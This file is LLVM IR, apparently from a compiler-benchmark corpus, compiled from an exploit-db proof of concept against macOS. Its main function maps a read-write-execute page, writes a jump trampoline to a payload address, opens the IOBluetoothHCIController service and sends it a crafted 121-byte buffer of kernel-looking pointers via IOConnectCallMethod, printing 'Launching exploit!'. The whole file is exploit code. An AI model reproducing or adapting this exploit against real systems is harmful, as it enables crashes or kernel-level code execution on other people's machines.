; ModuleID = '/home/carl/AnghaBench/exploitdb/exploits/osx/dos/extr_35153.c_main.c'
source_filename = "/home/carl/AnghaBench/exploitdb/exploits/osx/dos/extr_35153.c_main.c"
target datalayout = "e-m:e-p270:32:32-p271:32:32-p272:64:64-i64:64-f80:128-n8:16:32:64-S128"
target triple = "x86_64-unknown-linux-gnu"

@VM_PROT_READ = common dso_local global i32 0, align 4
@VM_PROT_WRITE = common dso_local global i32 0, align 4
@VM_PROT_EXECUTE = common dso_local global i32 0, align 4
@payload = common dso_local global i64 0, align 8
@.str = private unnamed_addr constant [34 x i8] c" [+] Payload function  @ %016llx\0A\00", align 1
@.str.1 = private unnamed_addr constant [34 x i8] c" [+] Stored trampoline @ %016llx\0A\00", align 1
@kIOMasterPortDefault = common dso_local global i32 0, align 4
@.str.2 = private unnamed_addr constant [25 x i8] c"IOBluetoothHCIController\00", align 1
@kIOReturnSuccess = common dso_local global i64 0, align 8
@.str.3 = private unnamed_addr constant [47 x i8] c" [+] Opened connection to service on port: %d\0A\00", align 1
@__const.main.a = private unnamed_addr constant [121 x i8] c"\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\07\02\00\00\00\11\0A\00\00\03r\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\E8\FA*T\FF\7F\00\00x\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\A8\FB*T\FF\7F\00\00\D8\FA*T\FF\7F\00\00`J\B6\86\80\FF\FF\FF\A8\B6\F5\FF\80\FF\FF\FF\00", align 16
@.str.4 = private unnamed_addr constant [25 x i8] c" [+] Launching exploit!\0A\00", align 1

; Function Attrs: noinline nounwind optnone uwtable
define dso_local i32 @main() #0 {
  %1 = alloca i32, align 4
  %2 = alloca i32, align 4
  %3 = alloca i8*, align 8
  %4 = alloca i32, align 4
  %5 = alloca i32, align 4
  %6 = alloca i64, align 8
  %7 = alloca [121 x i8], align 16
  store i32 0, i32* %1, align 4
  store i32 0, i32* %2, align 4
  %8 = call i32 (...) @mach_task_self()
  %9 = call i32 @vm_allocate(i32 %8, i32* %2, i32 4096, i32 0)
  %10 = call i32 (...) @mach_task_self()
  %11 = load i32, i32* %2, align 4
  %12 = load i32, i32* @VM_PROT_READ, align 4
  %13 = load i32, i32* @VM_PROT_WRITE, align 4
  %14 = or i32 %12, %13
  %15 = load i32, i32* @VM_PROT_EXECUTE, align 4
  %16 = or i32 %14, %15
  %17 = call i32 @vm_protect(i32 %10, i32 %11, i32 4096, i32 0, i32 %16)
  %18 = load i32, i32* %2, align 4
  %19 = sext i32 %18 to i64
  %20 = inttoptr i64 %19 to i8*
  %21 = call i32 @memset(i8* %20, i32 0, i32 4096)
  %22 = load i32, i32* %2, align 4
  %23 = sext i32 %22 to i64
  %24 = inttoptr i64 %23 to i8*
  store i8* %24, i8** %3, align 8
  %25 = load i8*, i8** %3, align 8
  %26 = getelementptr inbounds i8, i8* %25, i64 7
  store i8 72, i8* %26, align 1
  %27 = load i8*, i8** %3, align 8
  %28 = getelementptr inbounds i8, i8* %27, i64 8
  store i8 -72, i8* %28, align 1
  %29 = load i64, i64* @payload, align 8
  %30 = load i8*, i8** %3, align 8
  %31 = getelementptr inbounds i8, i8* %30, i64 9
  %32 = bitcast i8* %31 to i64*
  store i64 %29, i64* %32, align 8
  %33 = load i8*, i8** %3, align 8
  %34 = getelementptr inbounds i8, i8* %33, i64 17
  store i8 -1, i8* %34, align 1
  %35 = load i8*, i8** %3, align 8
  %36 = getelementptr inbounds i8, i8* %35, i64 18
  store i8 -32, i8* %36, align 1
  %37 = load i64, i64* @payload, align 8
  %38 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([34 x i8], [34 x i8]* @.str, i64 0, i64 0), i64 %37)
  %39 = load i32, i32* %2, align 4
  %40 = sext i32 %39 to i64
  %41 = add nsw i64 %40, 7
  %42 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([34 x i8], [34 x i8]* @.str.1, i64 0, i64 0), i64 %41)
  %43 = load i32, i32* @kIOMasterPortDefault, align 4
  %44 = call i32 @IOServiceMatching(i8* getelementptr inbounds ([25 x i8], [25 x i8]* @.str.2, i64 0, i64 0))
  %45 = call i32 @IOServiceGetMatchingService(i32 %43, i32 %44)
  store i32 %45, i32* %4, align 4
  %46 = load i32, i32* %4, align 4
  %47 = icmp ne i32 %46, 0
  br i1 %47, label %49, label %48

48:                                               ; preds = %0
  store i32 -1, i32* %1, align 4
  br label %71

49:                                               ; preds = %0
  store i32 0, i32* %5, align 4
  %50 = load i32, i32* %4, align 4
  %51 = call i32 (...) @mach_task_self()
  %52 = call i64 @IOServiceOpen(i32 %50, i32 %51, i32 0, i32* %5)
  store i64 %52, i64* %6, align 8
  %53 = load i32, i32* %4, align 4
  %54 = call i32 @IOObjectRelease(i32 %53)
  %55 = load i64, i64* %6, align 8
  %56 = load i64, i64* @kIOReturnSuccess, align 8
  %57 = icmp ne i64 %55, %56
  br i1 %57, label %58, label %61

58:                                               ; preds = %49
  %59 = load i64, i64* %6, align 8
  %60 = trunc i64 %59 to i32
  store i32 %60, i32* %1, align 4
  br label %71

61:                                               ; preds = %49
  %62 = load i32, i32* %5, align 4
  %63 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([47 x i8], [47 x i8]* @.str.3, i64 0, i64 0), i32 %62)
  %64 = bitcast [121 x i8]* %7 to i8*
  call void @llvm.memcpy.p0i8.p0i8.i64(i8* align 16 %64, i8* align 16 getelementptr inbounds ([121 x i8], [121 x i8]* @__const.main.a, i32 0, i32 0), i64 121, i1 false)
  %65 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([25 x i8], [25 x i8]* @.str.4, i64 0, i64 0))
  %66 = load i32, i32* %5, align 4
  %67 = getelementptr inbounds [121 x i8], [121 x i8]* %7, i64 0, i64 0
  %68 = call i64 @IOConnectCallMethod(i32 %66, i32 0, i32* null, i32 0, i8* %67, i32 121, i32* null, i32* null, i32* null, i32* null)
  store i64 %68, i64* %6, align 8
  %69 = load i32, i32* %5, align 4
  %70 = call i32 @IOServiceClose(i32 %69)
  store i32 %70, i32* %1, align 4
  br label %71

71:                                               ; preds = %61, %58, %48
  %72 = load i32, i32* %1, align 4
  ret i32 %72
}

declare dso_local i32 @vm_allocate(i32, i32*, i32, i32) #1

declare dso_local i32 @mach_task_self(...) #1

declare dso_local i32 @vm_protect(i32, i32, i32, i32, i32) #1

declare dso_local i32 @memset(i8*, i32, i32) #1

declare dso_local i32 @printf(i8*, ...) #1

declare dso_local i32 @IOServiceGetMatchingService(i32, i32) #1

declare dso_local i32 @IOServiceMatching(i8*) #1

declare dso_local i64 @IOServiceOpen(i32, i32, i32, i32*) #1

declare dso_local i32 @IOObjectRelease(i32) #1

; Function Attrs: argmemonly nounwind willreturn
declare void @llvm.memcpy.p0i8.p0i8.i64(i8* noalias nocapture writeonly, i8* noalias nocapture readonly, i64, i1 immarg) #2

declare dso_local i64 @IOConnectCallMethod(i32, i32, i32*, i32, i8*, i32, i32*, i32*, i32*, i32*) #1

declare dso_local i32 @IOServiceClose(i32) #1

attributes #0 = { noinline nounwind optnone uwtable "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "min-legal-vector-width"="0" "no-infs-fp-math"="false" "no-jump-tables"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #1 = { "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #2 = { argmemonly nounwind willreturn }

!llvm.module.flags = !{!0}
!llvm.ident = !{!1}

!0 = !{i32 1, !"wchar_size", i32 4}
!1 = !{!"clang version 10.0.1 (https://github.com/wsmoses/llvm-project-tok c8e5003577614e72d6d18a216e6a09771e1fcce4)"}
